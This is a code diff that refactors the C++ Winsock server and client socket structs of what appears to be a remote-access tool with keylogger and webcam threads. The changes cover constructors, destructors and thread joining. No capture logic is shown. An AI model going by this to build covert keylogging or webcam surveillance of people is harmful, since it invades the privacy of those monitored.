@@ -20,7 +20,7 @@ const int maxBufferSize = 1024;
 struct ServerSocket {
 	SOCKET listenSocket;
 	SOCKET clientSocket;
-	bool isServerOn;
+	bool isServerOn = false;
 	bool isKeyloggerOn = false;
 	bool isWebcamOn = false;
 	thread keyloggerThread;
@@ -70,6 +70,7 @@ struct ServerSocket {
 		cout << "Client connected!" << endl;
 	}
 	void Shutdown() {
+		//dont connect yet
 		if (shutdown(clientSocket, SD_SEND) == SOCKET_ERROR) {
 			printf("shutdown failed with error: %d\n", WSAGetLastError());
 			closesocket(clientSocket);
@@ -119,24 +120,22 @@ struct ServerSocket {
 			listenSocket = INVALID_SOCKET;
 		}
 	}
-	ServerSocket();
+	void TurnOn();
 	void Reset() {
 		Shutdown();
 		Close();
 		isKeyloggerOn = false;
 		isWebcamOn = false;
 		isServerOn = false;
-		GetServerAddrInfo();
-		listenSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
-		clientSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
-		SetSocketOption();
-		if (listenSocket == INVALID_SOCKET) {
-			cout << "Socket creation failed: " << WSAGetLastError() << endl;
-			WSACleanup();
-		}
-		BindSocket();
-		keyloggerThread.join();
-		webcamThread.join();
+		if (keyloggerThread.joinable()) 
+			keyloggerThread.join();
+		if (webcamThread.joinable()) 
+			webcamThread.join();
+	}
+	~ServerSocket() {
+		Reset();
+		if (serverAddr)
+			freeaddrinfo(serverAddr);
 	}
 };
 struct ClientSocket {
@@ -228,7 +227,7 @@ struct ClientSocket {
 			closesocket(clientSocket);
 		}
 	}
-	ClientSocket() {
+	void TurnOn() {
 		GetServerAddrInfo();
 		clientSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
 		if (clientSocket == INVALID_SOCKET) {
@@ -245,6 +244,11 @@ struct ClientSocket {
 			cout << "Socket creation failed: " << WSAGetLastError() << endl;
 			WSACleanup();
 		}
+	}
+	~ClientSocket() {
+		Reset();
+		if (serverAddr)
+			freeaddrinfo(serverAddr);
 	}
 };
 void InitWinsock(WSADATA& wsadata);
